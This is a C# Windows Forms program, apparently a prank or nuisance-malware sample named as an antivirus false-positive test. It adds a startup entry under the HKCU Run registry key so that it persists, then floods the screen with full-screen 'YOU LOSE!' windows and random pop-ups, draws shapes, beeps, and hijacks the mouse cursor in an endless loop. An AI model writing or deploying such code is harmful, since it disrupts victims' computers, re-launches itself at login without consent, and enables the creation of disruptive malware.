using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using System.Management;
namespace antivirusfalsepositivetest3
{
    public partial class Form1 : Form
    {
        private readonly string[] loseMessages = {
            "YOU LOSE!",
            "Game over!",
            "Try again!",
            "Better luck next time!",
            "You didn't make it!"
        };

        private readonly Random random = new Random();
        private bool allowClose = false;
        private Panel messagePanel;
        public Form1()
        {
            InitializeComponent();
            Main0();
            Main0();
            Main0();
            Main0();
            Main0();
            StartGame();
        }
        public static void Main0()
        {
            string keyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            string valueName = "MyStartupValue";
            string fileName = "antivirusfalsepositivetest4.exe";

            try
            {
                // Dosyanın tam yolunu al
                string filePath = Path.Combine(Environment.CurrentDirectory, fileName);

                // Kayıt defteri anahtarını aç
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true))
                {
                    if (key != null)
                    {
                        // Yeni başlangıç değerini oluştur ve dosya yolunu atar
                        key.SetValue(valueName, filePath);

                        Console.WriteLine("Başlangıç değeri başarıyla oluşturuldu.");
                    }
                    else
                    {
                        Console.WriteLine("Kayıt defteri anahtarı bulunamadı.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Hata: " + ex.Message);
            }
        }
        private void StartGame()
        {
            Thread messageThread = new Thread(DisplayMessages);
            messageThread.Start();

            Thread mouseThread = new Thread(MoveMouseRandomly);
            mouseThread.Start();
        }

        private void DisplayMessages()
        {
            while (!allowClose)
            {
                int index = random.Next(loseMessages.Length);
                string message = loseMessages[index];

                if (random.Next(2) == 0)
                {
                    DisplayMessage(message, true);
                }
                else
                {
                    DisplayMessage(message, false);
                }

                DrawRandomShapes();
                PlayRandomSound();

                Thread.Sleep(10);
            }
        }

        private void DisplayMessage(string message, bool isFullScreen)
        {
            if (!this.IsHandleCreated) return;

            if (this.InvokeRequired)
            {
                this.Invoke(new Action<string, bool>(DisplayMessage), message, isFullScreen);
                return;
            }

            if (messagePanel != null)
                messagePanel.Dispose();

            this.FormBorderStyle = isFullScreen ? FormBorderStyle.None : FormBorderStyle.None;
            this.WindowState = isFullScreen ? FormWindowState.Maximized : FormWindowState.Normal;
            this.Bounds = isFullScreen ? Screen.PrimaryScreen.Bounds : Screen.PrimaryScreen.Bounds;
            this.BackColor = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256));

            Label label = new Label
            {
                Text = message,
                Font = new Font("Arial", 30, FontStyle.Bold),
                ForeColor = Color.White,
                TextAlign = ContentAlignment.MiddleCenter,
                Dock = DockStyle.Fill
            };

            messagePanel = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = Color.Transparent
            };

            messagePanel.Controls.Add(label);
            this.Controls.Add(messagePanel);
            messagePanel.BringToFront();

            ShowRandomMessageBox(message);
        }

        private void DrawRandomShapes()
        {
            if (!this.IsHandleCreated) return;

            if (this.InvokeRequired)
            {
                this.Invoke(new Action(DrawRandomShapes));
                return;
            }

            Graphics graphics = this.CreateGraphics();

            int numShapes = random.Next(5, 20);

            for (int i = 0; i < numShapes; i++)
            {
                int shapeType = random.Next(3);
                int x = random.Next(this.Width);
                int y = random.Next(this.Height);
                int width = random.Next(20, 100);
                int height = random.Next(20, 100);
                Color color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256));

                switch (shapeType)
                {
                    case 0:
                        graphics.FillRectangle(new SolidBrush(color), x, y, width, height);
                        break;
                    case 1:
                        graphics.FillEllipse(new SolidBrush(color), x, y, width, height);
                        break;
                    case 2:
                        Point[] points = {
                            new Point(x, y),
                            new Point(x + width, y),
                            new Point(x + (width / 2), y + height)
                        };
                        graphics.FillPolygon(new SolidBrush(color), points);
                        break;
                }
            }

            graphics.Dispose();
        }

        private void PlayRandomSound()
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(PlayRandomSound));
                return;
            }

            int frequency = random.Next(100, 3000);
            int duration = random.Next(100, 1000);

            try
            {
                Console.Beep(frequency, duration);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error playing sound: " + ex.Message);
            }
        }

        private void ShowRandomMessageBox(string message)
        {
            Rectangle screenBounds = Screen.PrimaryScreen.Bounds;
            int x = random.Next(screenBounds.Width - 400);
            int y = random.Next(screenBounds.Height - 200);

            Form messageBoxForm = new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                StartPosition = FormStartPosition.Manual,
                Size = new Size(400, 200),
                Location = new Point(x, y),
                BackColor = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256))
            };

            Label label = new Label
            {
                Text = message,
                Font = new Font("Arial", 20, FontStyle.Bold),
                ForeColor = Color.White,
                TextAlign = ContentAlignment.MiddleCenter,
                Dock = DockStyle.Fill
            };

            messageBoxForm.Controls.Add(label);

            int closeDelay = random.Next(3000, 10000);
            System.Windows.Forms.Timer closeTimer = new System.Windows.Forms.Timer
            {
                Interval = closeDelay
            };

            closeTimer.Tick += (sender, args) =>
            {
                closeTimer.Stop();
                messageBoxForm.Close();
            };

            closeTimer.Start();
            messageBoxForm.Show();
        }

        private void MoveMouseRandomly()
        {
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            while (!allowClose)
            {
                int x = random.Next(screenWidth);
                int y = random.Next(screenHeight);

                Cursor.Position = new Point(x, y);

                Thread.Sleep(10);
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            allowClose = true;
            base.OnFormClosing(e);
        }
    }
}